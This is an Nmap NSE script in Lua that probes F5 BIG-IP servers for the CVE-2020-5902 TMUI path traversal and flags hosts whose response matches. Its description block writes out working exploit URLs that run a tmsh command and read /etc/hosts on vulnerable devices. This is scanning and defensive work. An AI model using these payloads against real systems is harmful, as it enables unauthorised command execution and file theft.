local http = require "http"
local stdnse = require "stdnse"
local shortport = require "shortport"
local string = require "string"
local vulns = require "vulns"
local nmap = require "nmap"
local io = require "io"

description = [[ This NSE script checks whether the target server is vulnerable to CVE-2020-5902 ]]
author = "b0yd (@rwincey)"
license = "Same as Nmap--See https://nmap.org/book/man-legal.html"
categories = {"discovery","default","exploit","vuln"}

portrule = shortport.http

action = function(host,port)
  
  local vuln = {
    title = 'F5 BigIP TMUI Path Traversal',
    state = vulns.STATE.NOT_EXPLOIT,
    description = [[ In BIG-IP versions 15.0.0-15.1.0.3, 14.1.0-14.1.2.5, 13.1.0-13.1.3.3, 12.1.0-12.1.5.1, and 11.6.1-11.6.5.1, the Traffic Management User Interface (TMUI), also referred to as the Configuration utility, has a Remote Code Execution (RCE) vulnerability in undisclosed pages.
    RCE=/tmui/login.jsp/..;/tmui/workspace/tmshCmd.jsp?command=list+auth+user+admin
    LFI=/tmui/login.jsp/..;/tmui/workspace/fileRead.jsp?fileName=/etc/hosts
    ]],
    references = {
      'https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-5902',
      'https://support.f5.com/csp/article/K52145254',
    },
    dates = {
      disclosure = {year = '2020', month = '6', day = '30'},
    },
  }
  local vuln_report = vulns.Report:new(SCRIPT_NAME, host, port)
  local path = "/tmui/login.jsp/..;/tmui/system/user/authproperties.jsp"
  local response
  local success = "Host is vulnerable to CVE-2020-5902"
  local fail = "Host is not vulnerable"
  local match = "PageRenderer"
  local f5_path_traversal
	
  response = http.get(host, port, path)  

  if not response.status then
    stdnse.print_debug("Request Failed")
    return
  end
  if response.status == 200 then
    if string.match(response.body, match) then
      stdnse.print_debug("%s: %s GET %s - 200 OK", SCRIPT_NAME,host.targetname or host.ip, path)
      vuln.state = vulns.STATE.EXPLOIT
      f5_path_traversal = (("Path traversal: https://%s:%d%s"):format(host.targetname or host.ip,port.number,path))
	  vuln.check_results = stdnse.format_output(true, f5_path_traversal)
    end
  elseif response.status == 403 then
    stdnse.print_debug("%s: %s GET %s - %d", SCRIPT_NAME, host.targetname or host.ip, port.number, response.status)
    vuln.state = vulns.STATE.NOT_EXPLOIT
  end

  return vuln_report:make_output(vuln)
end
